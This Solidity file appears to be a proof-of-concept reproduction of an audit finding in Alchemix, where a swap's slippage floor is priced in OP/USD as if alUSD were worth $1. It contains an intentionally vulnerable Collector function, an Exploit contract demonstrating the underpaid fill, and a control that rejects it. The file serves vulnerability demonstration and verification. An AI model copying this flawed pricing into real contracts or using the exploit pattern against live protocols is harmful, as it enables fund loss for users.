// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Alchemix — slippage minimum uses OP/USD instead of alUSD
    (Sherlock 2024-04 H-1, finding 32243).
    1000 OP at $2 is quoted as 2000 alUSD, as if alUSD were $1.
    alUSD is $0.80, so the fair amount is 2500 and the 1% floor is 2475.
    The buggy floor is 1980. The swap fills at 1980. The 495 below the real
    floor is paid to the caller. The control computes 2475 and rejects 1980. */

contract Asset {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Collector {
    address public alUsd;
    int256 public opToUsd = 2e8;
    int256 public alUsdToUsd = 8e7;
    uint256 public totalToSwap = 1_000 ether;
    uint256 public constant BPS = 10_000;
    uint256 public constant SLIPPAGE_BPS = 9_900;
    uint256 public expectedExchange;
    uint256 public minimum;
    uint256 public fairExpected;
    uint256 public fairMinimum;

    constructor(address alUsd_) {
        alUsd = alUsd_;
    }

    function getExpectedExchange(address debtToken) external returns (uint256) {
        if (debtToken == alUsd) {
            // @> VULN: OP/USD treats alUSD as $1
            expectedExchange = totalToSwap * uint256(opToUsd) / 1e8;
        }
        return expectedExchange;
    }

    function minimumOut(address debtToken) external returns (uint256) {
        uint256 expected = this.getExpectedExchange(debtToken);
        minimum = expected * SLIPPAGE_BPS / BPS;
        return minimum;
    }

    function fairOut() external returns (uint256) {
        fairExpected = totalToSwap * uint256(opToUsd) / uint256(alUsdToUsd);
        fairMinimum = fairExpected * SLIPPAGE_BPS / BPS;
        return fairMinimum;
    }
}

contract Router {
    Asset public token;
    uint256 public filled;

    constructor(Asset token_) {
        token = token_;
    }

    function swap(address to, uint256 minOut) external returns (uint256 out) {
        out = minOut;
        require(token.balanceOf(address(this)) >= out, "inventory");
        filled = out;
        require(token.transfer(to, out), "fill");
    }

    function swapProtected(address to, uint256 minOut, uint256 floor_) external returns (uint256 out) {
        require(minOut >= floor_, "floor");
        out = minOut;
        require(token.balanceOf(address(this)) >= out, "inventory");
        filled = out;
        require(token.transfer(to, out), "fill");
    }
}

contract Exploit {
    Asset public token;
    Collector public collector;
    Router public router;
    uint256 public quotedMin;
    uint256 public intendedMin;
    uint256 public filled;
    uint256 public shortfall;
    bool public controlRejected;
    uint256 public controlFilled;

    constructor() {
        token = new Asset();
        collector = new Collector(address(token));
        router = new Router(token);
    }

    function run() external {
        token.mint(address(router), 2_500 ether);
        quotedMin = collector.minimumOut(address(token));
        intendedMin = collector.fairOut();
        filled = router.swap(address(collector), quotedMin);
        shortfall = intendedMin - filled;
        router.swap(address(this), shortfall);
        require(collector.expectedExchange() == 2_000 ether, "expected");
        require(quotedMin == 1_980 ether, "min");
        require(intendedMin == 2_475 ether, "fair min");
        require(filled == 1_980 ether, "fill");
        require(filled < intendedMin, "worse");
        require(shortfall == 495 ether, "short");
    }

    function runControl() external {
        token.mint(address(router), 2_500 ether);
        uint256 fairMin = collector.fairOut();
        (bool ok,) = address(router).call(
            abi.encodeWithSignature("swapProtected(address,uint256,uint256)", address(this), 1_980 ether, fairMin)
        );
        controlRejected = !ok;
        require(controlRejected, "rejected");
        controlFilled = router.swapProtected(address(this), fairMin, fairMin);
        require(controlFilled == 2_475 ether, "fair fill");
        require(controlFilled >= fairMin, "floor");
    }
}
